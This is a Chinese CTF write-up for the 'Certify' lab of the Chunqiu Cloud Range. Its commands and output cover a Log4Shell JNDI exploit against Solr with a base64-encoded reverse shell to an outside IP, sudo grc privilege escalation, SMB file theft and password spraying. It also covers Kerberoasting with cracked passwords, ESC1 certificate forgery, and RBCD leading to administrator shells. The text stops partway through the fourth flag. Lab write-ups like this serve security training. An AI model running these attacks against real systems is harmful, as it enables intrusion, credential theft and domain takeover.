+++
date = '2026-03-11T10:00:00+08:00'
lastmod = '2026-03-11T11:00:00+08:00'
draft = false
title = '春秋云境 - Certify WriteUP'
categories = ['WriteUP', '春秋云境']
tags = ['WriteUP', '春秋云境']

+++

### flag 1

首先，fscan 信息收集。

```plaintext
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.227.148:80 open
39.99.227.148:8983 open
39.99.227.148:22 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://39.99.227.148      code:200 len:612    title:Welcome to nginx!
[*] WebTitle http://39.99.227.148:8983 code:302 len:0      title:None 跳转url: http://39.99.227.148:8983/solr/
[*] WebTitle http://39.99.227.148:8983/solr/ code:200 len:16555  title:Solr Admin
已完成 3/3
[*] 扫描结束,耗时: 45.4914693s
```

我们发现，这里存在熟悉的 Solr 服务，之前也打过这个服务的漏洞，但是发现是新版 Solr，之前打的方式在这里用不了，然后我们发现它有用 log4j，所以找到漏洞 CVE-2021-44228，进行利用。

```bash
java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzIuMTQ4LjEzMS8xMjM1IDA+JjE=}|{base64,-d}|{bash,-i}" -A "117.72.148.131"
```

工具有点问题，最后还是用无敌的 Java Chains 打通了。

![](b17a28db-aaf9-4e7b-ba42-5a3029e512a8.png)

PoC 数据包如下。

```plaintext
GET /solr/admin/cores?action=${jndi:ldap://117.72.148.131:50389/5a4fec} HTTP/1.1
Host: 39.99.227.148:8983
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mitm/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36


```

我们发现当前是低权限用户，想办法提权。

```bash
find / -perm -u=s -type f 2>/dev/null
```

结果如下。

```plaintext
solr@ubuntu:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

尝试用 sudo 提权。

```bash
sudo -l
```

结果如下。

```plaintext
solr@ubuntu:/tmp$ sudo -l
Matching Defaults entries for solr on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User solr may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/grc
```

发现 grc 不用密码就可以以 root 权限启动，然后用 grc 提权。

```bash
sudo grc --pty /bin/sh
```

然后我们拿到 flag01。

```plaintext
   ██████                   ██   ██   ████         
  ██░░░░██                 ░██  ░░   ░██░   ██   ██
 ██    ░░   █████  ██████ ██████ ██ ██████ ░░██ ██ 
░██        ██░░░██░░██░░█░░░██░ ░██░░░██░   ░░███  
░██       ░███████ ░██ ░   ░██  ░██  ░██     ░██   
░░██    ██░██░░░░  ░██     ░██  ░██  ░██     ██    
 ░░██████ ░░██████░███     ░░██ ░██  ░██    ██     
  ░░░░░░   ░░░░░░ ░░░       ░░  ░░   ░░    ░░      

Easy right?
Maybe you should dig into my core domain network.

flag01: flag{43ef4463-0322-47bb-872c-0266db357a88}
```

### flag 2

信息收集，启动。

```plaintext
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.9.19  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe04:ba1c  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:04:ba:1c  txqueuelen 1000  (Ethernet)
        RX packets 185820  bytes 204807889 (204.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 78387  bytes 21211701 (21.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3310  bytes 412474 (412.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3310  bytes 412474 (412.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

fscan 扫描结果如下。

```plaintext
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.9.19     is alive
(icmp) Target 172.22.9.7      is alive
(icmp) Target 172.22.9.26     is alive
(icmp) Target 172.22.9.47     is alive
[*] Icmp alive hosts len is: 4
172.22.9.7:88 open
172.22.9.7:53 open
172.22.9.7:80 open
172.22.9.47:80 open
172.22.9.19:80 open
172.22.9.19:22 open
172.22.9.47:21 open
172.22.9.7:139 open
172.22.9.47:139 open
172.22.9.26:139 open
172.22.9.7:135 open
172.22.9.26:135 open
172.22.9.47:22 open
172.22.9.7:445 open
172.22.9.47:445 open
172.22.9.26:445 open
172.22.9.7:389 open
172.22.9.7:464 open
172.22.9.7:593 open
172.22.9.7:636 open
172.22.9.7:3269 open
172.22.9.7:3268 open
172.22.9.26:3389 open
172.22.9.7:3389 open
172.22.9.19:8983 open
172.22.9.7:9389 open
172.22.9.7:15774 open
172.22.9.26:15774 open
172.22.9.7:47001 open
172.22.9.26:47001 open
172.22.9.26:49664 open
172.22.9.7:49664 open
172.22.9.26:49665 open
172.22.9.7:49665 open
172.22.9.7:49666 open
172.22.9.26:49666 open
172.22.9.7:49667 open
172.22.9.26:49668 open
172.22.9.7:49669 open
172.22.9.26:49669 open
172.22.9.26:49670 open
172.22.9.7:49672 open
172.22.9.26:49675 open
172.22.9.7:49675 open
172.22.9.7:49676 open
172.22.9.7:49677 open
172.22.9.26:49680 open
172.22.9.7:49680 open
172.22.9.7:49689 open
172.22.9.7:49692 open
172.22.9.7:49726 open
172.22.9.7:57487 open
[*] alive ports len is: 52
start vulscan
[*] NetInfo 
[*]172.22.9.26
   [->]DESKTOP-CBKTVMO
   [->]172.22.9.26
[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    
[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
[*] NetInfo 
[*]172.22.9.7
   [->]XIAORANG-DC
   [->]172.22.9.7
[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] WebTitle http://172.22.9.26:47001  code:404 len:315    title:Not Found
[*] NetBios 172.22.9.47     fileserver                          Windows 6.1
[*] OsInfo 172.22.9.47  (Windows 6.1)
[*] WebTitle http://172.22.9.7:47001   code:404 len:315    title:Not Found
[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server
[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect 
[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin
```

我们尝试进一步扫描 `172.22.9.47`，用 smbclient 去查看它共享了什么位置。

```bash
proxychains4 smbclient -L //172.22.9.47 -N
```

结果如下。

```plaintext
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
fileshare       Disk      bill share
IPC$            IPC       IPC Service (fileserver server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.


Server               Comment
---------            -------

Workgroup            Master
---------            -------
WORKGROUP            FILESERVER
```

那么我们尝试直接去连接 SMB，我们发现随便输个密码都能登录进去。

```bash
proxychains4 smbclient \\\\172.22.9.47\\fileshare
```

接着读取文件。

```cmd
dir
get personnel.db
cd secret
get flag02.txt
```

我们获取到 flag02 如下。

```plaintext
 ________  _______   ________  _________  ___  ________ ___    ___
|\   ____\|\  ___ \ |\   __  \|\___   ___\\  \|\  _____\\  \  /  /|
\ \  \___|\ \   __/|\ \  \|\  \|___ \  \_\ \  \ \  \__/\ \  \/  / /
 \ \  \    \ \  \_|/_\ \   _  _\   \ \  \ \ \  \ \   __\\ \    / /
  \ \  \____\ \  \_|\ \ \  \\  \|   \ \  \ \ \  \ \  \_| \/  /  /
   \ \_______\ \_______\ \__\\ _\    \ \__\ \ \__\ \__\__/  / /
    \|_______|\|_______|\|__|\|__|    \|__|  \|__|\|__|\___/ /
                                                      \|___|/

flag02: flag{6cf6d599-c65e-4282-aa09-591555648049}

Yes, you have enumerated smb. But do you know what an SPN is?
```

### flag 3

根据从 SMB 中拿到的数据库，我们可以获取到两个关键数据，分别是用户名和可能的密码。

![](52b59a80ada969c3b5df67494b793abe.png)

![](ec4e9c4f-98c2-4fb4-8203-8607ebeb41cf.png)

也就是说，下面，我们导出这些用户名之后，要尝试将密码和用户对应上，去登录其他主机。

```bash
proxychains4 crackmapexec smb 172.22.9.26 -u users.txt -p password.txt --continue-on-success 2>/dev/null
```

结果如下。

```plaintext
SMB         172.22.9.26     445    DESKTOP-CBKTVMO  [+] xiaorang.lab\zhangjian:i9XDE02pLVf
SMB         172.22.9.26     445    DESKTOP-CBKTVMO  [+] xiaorang.lab\liupeng:fiAzGwEMgTY
```

根据提示，我们去查找注册在域用户下的 SPN。

```bash
proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian
```

我们找到了两个 TGS 票据。

```plaintext
$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$2cfa4a98457630f8581db90130b19898$1be8c08ba20324feea7cc081eb7d06050d3b06217bf8a4f0bd9623965e6859af8666b24b25d078e3f6eaee853d1e6f9778ab34bea8cedc82e0c0e822a8d67ea14f98a3a8d843d8e864d2af85f05f078ac661e6857c67659493d94121b25750d7eb351baf7df46395bd325edbf8bb94a0a8daf7deb69858cdc240048203a2d5b0f78a8ef9ca2f18deecf6f3910bfa3530444e319ef51c576f440fd77693d80ac1fdebf45e777176506ab6b3fcb938e5d8643eca2048fddabb4f3ea76d352a8b518877413abc76a02ef67ecf0815fcf1f9ae12f2cbabe90ad53291f198119ad737f6f00021c5d80afe358698067df0911064a9ad01ad53ffe55f696f1404a08aa251352595d71f1428a84dcf54309913350a802fff0d38adf5a3f4046f967cd67acd60389a08cb6d93782b9251c5c229ef4ee916de14876f1f8a9f4bce45307feb2c53591b4f1b634624307fef3448c34174a6e9fed4bcd69f09d699a31ee0f9933122efb9c8ddea0bb70fee799023d99e2cbe0e17f02eb72438fc0a5ad6adb559b8fdb67633a483f5ec566ec8542403291e18d5d785742a30552f5e7b20fe8c44cfdce4d8f50d42fa647cda4165a5f4b32738ca20cbcd868c4906015cba4574a031a25306afc0758eab0777b3973f21497a3cc68b5c040c360f98d989407c583dd97591ffeabf408fa650bc4adeddbd125ab6681f9d3637762acf799f8274d3647a1d206b41e5e68d4c7b2d129c90e74dbf4d2f961bed2816a4938bf2476e61c4ea9ea0e7d66b1fc1f00bd02cdee805c5e5affccf2b90a16e69ef40d03d5d9b1c66e503a6bb0c4ea41f5813c1ee86483db091b4e2707fe12a42d3bb16715f8ad42951f3fd66733d2f81240ba8cc5ee4935765ee9663436dbd7c5ea31cf2433568f42764e68bde043ef4480ba914977abcb7addf23d5875d8852c46f252c7f5957f67cf4ae36f89b8ab2571030612236393a7d7409a3936e1a19585168cd107e4e08a877562f806575a5e40f2491ea496e97c98f5500829dd2757b2894a6eb8363c39313c8c792a7ba59486fa0521450a816790a6bcaf0c9144a90643e60e095589f66717bf0d6f09fcbf9541662a1148ca5348e80b9213aabd00c5fcb6d45f38f497b169843a68242a65c08b663fe0b8a3e6045fcac0b3790fefe5eea79f7f9ff81ce838108bcfd25fc743cf3930ff6ee86c14b6a7f39d59312493ff34db85f556367cdf03ec96cd8d8ba5654724c0f4d536ad9f41f271d62c822777fc92ff4ffbf6942dd30bb77411264c76a5b3c86171dfb3e2c1e73d3fb22ae70efc04c68064a7ca2989af41c6a8bf736df0ff323f77360a82b86b30526761e59452ca79f4d15bf409825be7ac85640cde08d6178e977a4622fba3790c0fb223090390961e77e93c3603823d3adfcfc7d7bf3ea1e38cb5368a8dd2b1185fb9f2d3204770913c8e34d69d3e4164f19aaabfc910970945a78e16d8ab9e8beb69fe99ccd2f580d80e9b4247a88fc2386f337f038e2
$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$99b53192fd4c2222e94b39ddd6e958bc$34929d1c2fd9b5fac1503b50f49d756f379d136a1a9dfae484bffa579b4420d4587d403cd5f12729e1e175bfbbeaa2e173bfadf0d4bbd8453fa5109638ceee850febad1ca14f97121467a0e55dbd1944b6c632dadff07bbb5257def69d1ec93019e6942e8947028881f8a49e15d4c1a2268cbc302d4f8ac27c43a5db19c71c9d2dedcec9120e42698cb20c9749fbabd9feb8e759ea09fee4ad89a422b41ca382e74c8483c3bac3979af6443ebd5b4f0f2df60cc405c6b18c6afccdc555e15d950de56e61aa050a4897d2cda1ff890ddf5a6af0390c73b1c19603f9e24e9523cfb87d2c21c32ed8682db56b3ff4a9f21734f1d7830506ee321bc411a93daeba3e7d2b6c6a8baa2b4d7279ce697631401925f6e6de2d6ba218acbc84246971816ecfabfa763be0dae170d9ed9219833d11c98957ec5b221db49f51a2a19419af5b3ddd042205deaf6763e05873b325418ded904548d5b74e1df811c0340d98c3c69ba84462a1f0b5642475c2e1e992d472acf5c974958420552d530461d41d048d481bed389a4dd28d4f4aad587e167d09fafb60db37c576a2e45ac69c36b9447279e10775207bbb2859b71a6241fa7b7b40ebb9d121318df5ef01f45bf019af95a5f0989064402e52bf2c2b02a8ccf645bdcf61383b9271cb26da368303bf1d763425ac754fc202be9edf9f79b0d144be4c93b2b9bd5c6eb88c68de949df211c4dd705df9cb92584569303f11d5f27fd21a3b77f0abb35f0feede5c38c88eb09f431a94cbbe2a6ca11be4057933b609fe250565729e0e71b9b40641e30d040fff66563a83a494ba4b288a061f6f7c922b2b74bf861d4a570fab965620761315c26bc6ba250cc884628079296d9aa8c386f81eefb380c9ff9fc2de4f0761812b65d1cc99d81eb36b24bf01b54c5848514ca0f89c91db32bf631afb39780cd9cec0850a32f2f031dc1c810fdeee88c3507053b7c83e725da4581b97e25c26d5e07e5cd9d60b1975ddd1c27fabdf1e70b3a9a0a7e5656c04160abf413e46b6f2604b8d95f6939d9fc8ed5847caf9c95014727e00c9f907f6bd47e361ea1fa6ef4a8c64ed136f95653d6ef5576906c338d63b93b1c691a8c7b6745286a89efa22a1ebbab5449f00fda8074fb1f7856b574d09346c851f232833a60dbd9dce2bd5624854e05b082a4c308bd6086c5ea3bc4c66b758f3dbaa6bdca3517849c73ae73fd9c7e8f68cf575d91eae4cc25193d9fc7516de7291a1aad00bf64beee356a280524dd6714627cebffb4d408efa66802d70978a216a6b757477db6c2c76c95f18c44154d0bb6672ed8cd0c829b1ab6905ae1f6e0f8d847a6406af1288d366742ee12c3a328c6edc833ae16f82c8acc0a7f3f4a3a7a5715614400e13245f796b1430c44a3a75ed7fb9d7715856f02d0a70f5e9d3fe04698ac1cbf0e685ceaa580cab9125a7b0b810d38fd74a59b36b72bda98f21b471ffaffd9e22ba79182a4f6e9b3e52b0380f4a4c63f7d0c179a49d
```

我们可以用 hashcat 进行爆破。

```bash
hashcat hashs.txt /usr/share/wordlists/rockyou.txt --show
hashcat -a 0 -m 13100 hashs.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 13100 hashs.txt /usr/share/wordlists/rockyou.txt --show
```

结果如下。

```plaintext
$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$2cfa4a98457630f8581db90130b19898$1be8c08ba20324feea7cc081eb7d06050d3b06217bf8a4f0bd9623965e6859af8666b24b25d078e3f6eaee853d1e6f9778ab34bea8cedc82e0c0e822a8d67ea14f98a3a8d843d8e864d2af85f05f078ac661e6857c67659493d94121b25750d7eb351baf7df46395bd325edbf8bb94a0a8daf7deb69858cdc240048203a2d5b0f78a8ef9ca2f18deecf6f3910bfa3530444e319ef51c576f440fd77693d80ac1fdebf45e777176506ab6b3fcb938e5d8643eca2048fddabb4f3ea76d352a8b518877413abc76a02ef67ecf0815fcf1f9ae12f2cbabe90ad53291f198119ad737f6f00021c5d80afe358698067df0911064a9ad01ad53ffe55f696f1404a08aa251352595d71f1428a84dcf54309913350a802fff0d38adf5a3f4046f967cd67acd60389a08cb6d93782b9251c5c229ef4ee916de14876f1f8a9f4bce45307feb2c53591b4f1b634624307fef3448c34174a6e9fed4bcd69f09d699a31ee0f9933122efb9c8ddea0bb70fee799023d99e2cbe0e17f02eb72438fc0a5ad6adb559b8fdb67633a483f5ec566ec8542403291e18d5d785742a30552f5e7b20fe8c44cfdce4d8f50d42fa647cda4165a5f4b32738ca20cbcd868c4906015cba4574a031a25306afc0758eab0777b3973f21497a3cc68b5c040c360f98d989407c583dd97591ffeabf408fa650bc4adeddbd125ab6681f9d3637762acf799f8274d3647a1d206b41e5e68d4c7b2d129c90e74dbf4d2f961bed2816a4938bf2476e61c4ea9ea0e7d66b1fc1f00bd02cdee805c5e5affccf2b90a16e69ef40d03d5d9b1c66e503a6bb0c4ea41f5813c1ee86483db091b4e2707fe12a42d3bb16715f8ad42951f3fd66733d2f81240ba8cc5ee4935765ee9663436dbd7c5ea31cf2433568f42764e68bde043ef4480ba914977abcb7addf23d5875d8852c46f252c7f5957f67cf4ae36f89b8ab2571030612236393a7d7409a3936e1a19585168cd107e4e08a877562f806575a5e40f2491ea496e97c98f5500829dd2757b2894a6eb8363c39313c8c792a7ba59486fa0521450a816790a6bcaf0c9144a90643e60e095589f66717bf0d6f09fcbf9541662a1148ca5348e80b9213aabd00c5fcb6d45f38f497b169843a68242a65c08b663fe0b8a3e6045fcac0b3790fefe5eea79f7f9ff81ce838108bcfd25fc743cf3930ff6ee86c14b6a7f39d59312493ff34db85f556367cdf03ec96cd8d8ba5654724c0f4d536ad9f41f271d62c822777fc92ff4ffbf6942dd30bb77411264c76a5b3c86171dfb3e2c1e73d3fb22ae70efc04c68064a7ca2989af41c6a8bf736df0ff323f77360a82b86b30526761e59452ca79f4d15bf409825be7ac85640cde08d6178e977a4622fba3790c0fb223090390961e77e93c3603823d3adfcfc7d7bf3ea1e38cb5368a8dd2b1185fb9f2d3204770913c8e34d69d3e4164f19aaabfc910970945a78e16d8ab9e8beb69fe99ccd2f580d80e9b4247a88fc2386f337f038e2:MyPass2@@6
$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$99b53192fd4c2222e94b39ddd6e958bc$34929d1c2fd9b5fac1503b50f49d756f379d136a1a9dfae484bffa579b4420d4587d403cd5f12729e1e175bfbbeaa2e173bfadf0d4bbd8453fa5109638ceee850febad1ca14f97121467a0e55dbd1944b6c632dadff07bbb5257def69d1ec93019e6942e8947028881f8a49e15d4c1a2268cbc302d4f8ac27c43a5db19c71c9d2dedcec9120e42698cb20c9749fbabd9feb8e759ea09fee4ad89a422b41ca382e74c8483c3bac3979af6443ebd5b4f0f2df60cc405c6b18c6afccdc555e15d950de56e61aa050a4897d2cda1ff890ddf5a6af0390c73b1c19603f9e24e9523cfb87d2c21c32ed8682db56b3ff4a9f21734f1d7830506ee321bc411a93daeba3e7d2b6c6a8baa2b4d7279ce697631401925f6e6de2d6ba218acbc84246971816ecfabfa763be0dae170d9ed9219833d11c98957ec5b221db49f51a2a19419af5b3ddd042205deaf6763e05873b325418ded904548d5b74e1df811c0340d98c3c69ba84462a1f0b5642475c2e1e992d472acf5c974958420552d530461d41d048d481bed389a4dd28d4f4aad587e167d09fafb60db37c576a2e45ac69c36b9447279e10775207bbb2859b71a6241fa7b7b40ebb9d121318df5ef01f45bf019af95a5f0989064402e52bf2c2b02a8ccf645bdcf61383b9271cb26da368303bf1d763425ac754fc202be9edf9f79b0d144be4c93b2b9bd5c6eb88c68de949df211c4dd705df9cb92584569303f11d5f27fd21a3b77f0abb35f0feede5c38c88eb09f431a94cbbe2a6ca11be4057933b609fe250565729e0e71b9b40641e30d040fff66563a83a494ba4b288a061f6f7c922b2b74bf861d4a570fab965620761315c26bc6ba250cc884628079296d9aa8c386f81eefb380c9ff9fc2de4f0761812b65d1cc99d81eb36b24bf01b54c5848514ca0f89c91db32bf631afb39780cd9cec0850a32f2f031dc1c810fdeee88c3507053b7c83e725da4581b97e25c26d5e07e5cd9d60b1975ddd1c27fabdf1e70b3a9a0a7e5656c04160abf413e46b6f2604b8d95f6939d9fc8ed5847caf9c95014727e00c9f907f6bd47e361ea1fa6ef4a8c64ed136f95653d6ef5576906c338d63b93b1c691a8c7b6745286a89efa22a1ebbab5449f00fda8074fb1f7856b574d09346c851f232833a60dbd9dce2bd5624854e05b082a4c308bd6086c5ea3bc4c66b758f3dbaa6bdca3517849c73ae73fd9c7e8f68cf575d91eae4cc25193d9fc7516de7291a1aad00bf64beee356a280524dd6714627cebffb4d408efa66802d70978a216a6b757477db6c2c76c95f18c44154d0bb6672ed8cd0c829b1ab6905ae1f6e0f8d847a6406af1288d366742ee12c3a328c6edc833ae16f82c8acc0a7f3f4a3a7a5715614400e13245f796b1430c44a3a75ed7fb9d7715856f02d0a70f5e9d3fe04698ac1cbf0e685ceaa580cab9125a7b0b810d38fd74a59b36b72bda98f21b471ffaffd9e22ba79182a4f6e9b3e52b0380f4a4c63f7d0c179a49d:@Passw0rd@
```

整理得出账号密码如下。

```plaintext
xiaorang.lab\zhangxia:MyPass2@@6
xiaorang.lab\chenchen:@Passw0rd@
```

然后，第一个账户就可以登录了，我们先来一波信息收集。

```bash
proxychains4 bloodhound-python -c all -u 'zhangxia' -p 'MyPass2@@6' -d xiaorang.lab -ns 172.22.9.7 --zip --dns-tcp
```

![](12af9c8029c5ec7425852df6aff67138.png)

我们发现 `ZHANGXIA@XIAORANG.LAB` 对 `XIAORANG-DC.XIAORANG.LAB` 具有 GenericWrite 权限，也就是说我们在这里可以打 RBCD，这个在之后横向移动到 DC 服务器的时候有需要用到，同时，根据之前的信息收集，我们还注意到域内存在 AD CS，也就是说我们可以去用这个证书服务的漏洞去提权。

首先，我们先探测一下域内 CA 的信息，以及存在什么漏洞。

```bash
proxychains4 certipy-ad find -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout
```

结果如下。

```plaintext
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : xiaorang-XIAORANG-DC-CA
    DNS Name                            : XIAORANG-DC.xiaorang.lab
    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab
    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5
    Certificate Validity Start          : 2023-07-14 04:33:21+00:00
    Certificate Validity End            : 2028-07-14 04:43:21+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : XR Manager
    Display Name                        : XR Manager
    Certificate Authorities             : xiaorang-XIAORANG-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-07-14T04:51:15+00:00
    Template Last Modified              : 2023-07-14T04:51:44+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Domain Users
                                          XIAORANG.LAB\Enterprise Admins
                                          XIAORANG.LAB\Authenticated Users
      Object Control Permissions
        Owner                           : XIAORANG.LAB\Administrator
        Full Control Principals         : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Write Owner Principals          : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Write Dacl Principals           : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Write Property Enroll           : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Domain Users
                                          XIAORANG.LAB\Enterprise Admins
    [+] User Enrollable Principals      : XIAORANG.LAB\Authenticated Users
                                          XIAORANG.LAB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

找到 CA Name 为 `xiaorang-XIAORANG-DC-CA`，发现存在 ESC1 证书漏洞，允许普通用户伪造任意用户身份（包括域管）进行登录。

我们先添加一个机器用户。

```bash
proxychains4 impacket-addcomputer -method SAMR xiaorang.lab/zhangxia:MyPass2@@6 -computer-name test$ -computer-pass 'qwe123!@#' -dc-ip 172.22.9.7
```

然后，我们直接尝试申请证书。

```bash
proxychains4 certipy-ad req -u 'test$@xiaorang.lab' -p 'qwe123!@#' -ca 'xiaorang-XIAORANG-DC-CA' -target 172.22.9.7 -template 'XR Manager' -upn administrator@xiaorang.lab
```

然后，分离出 key 和 crt。

```bash
certipy-ad cert -pfx administrator.pfx -nokey -out admin.crt
certipy-ad cert -pfx administrator.pfx -nocert -out admin.key
```

然后，就可以登录到 DC 中命令执行了。

```bash
proxychains4 python3 /home/lucifer/Tools/PassTheCert/Python/passthecert.py -action whoami -crt admin.crt -key admin.key -domain xiaorang.lab -dc-ip 172.22.9.7
```

我们发现，确实能以管理员的身份登录到服务器中了。

![](4cf566eb0b15ffef8b42adbbdbe57e42.png)

然后我们去打 RBCD，将证书配置进去。

```bash
proxychains4 python3 /home/lucifer/Tools/PassTheCert/Python/passthecert.py -action write_rbcd -crt admin.crt -key admin.key -domain xiaorang.lab -dc-ip 172.22.9.7 -delegate-to 'DESKTOP-CBKTVMO$' -delegate-from 'test$'
```

结果如下。

```plaintext
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  117.72.148.131:6666  ...  172.22.9.7:636  ...  OK
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] test$ can now impersonate users on DESKTOP-CBKTVMO$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     test$        (S-1-5-21-990187620-235975882-534697781-1213)
```

然后去申请票据。

```bash
proxychains4 impacket-getST -dc-ip 172.22.9.7 -spn cifs/DESKTOP-CBKTVMO.xiaorang.lab 'xiaorang.lab/test$:qwe123!@#' -impersonate Administrator
```

导入票据。

```bash
export KRB5CCNAME=Administrator@cifs_DESKTOP-CBKTVMO.xiaorang.lab@XIAORANG.LAB.ccache
```

获取交互式 Shell。

```bash
proxychains4 impacket-psexec -k -no-pass Administrator@DESKTOP-CBKTVMO.xiaorang.lab -dc-ip 172.22.9.7 -codec gbk
```

从而拿到 flag 3。

```plaintext
                                ___              .-.
                               (   )      .-.   /    \
  .--.      .--.    ___ .-.     | |_     ( __)  | .`. ;   ___  ___
 /    \    /    \  (   )   \   (   __)   (''")  | |(___) (   )(   )
|  .-. ;  |  .-. ;  | ' .-. ;   | |       | |   | |_      | |  | |
|  |(___) |  | | |  |  / (___)  | | ___   | |  (   __)    | |  | |
|  |      |  |/  |  | |         | |(   )  | |   | |       | '  | |
|  | ___  |  ' _.'  | |         | | | |   | |   | |       '  `-' |
|  '(   ) |  .'.-.  | |         | ' | |   | |   | |        `.__. |
'  `-' |  '  `-' /  | |         ' `-' ;   | |   | |        ___ | |
 `.__,'    `.__.'  (___)         `.__.   (___) (___)      (   )' |
                                                           ; `-' '
                                                            .__.'

      flag03: flag{521ad4e0-e502-4d43-94ac-bebacc91196d}
```

### flag 4

```bash
proxychains4 impacket-addcomputer -method SAMR xiaorang.lab/zhangxia:MyPass2@@6 -computer-name test2$ -computer-pass 'qwe123!@#' -dc-ip 172.22.9.7
```

我们再去将证书配置到 DC 中。

```bash
proxychains4 python3 /home/lucifer/Tools/PassTheCert/Python/passthecert.py -action write_rbcd -crt admin.crt -key admin.key -domain xiaorang.lab -dc-ip 172.22.9.7 -delegate-to 'XIAORANG-DC$' -delegate-from 'test2$'
```

结果如下。

```plaintext
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
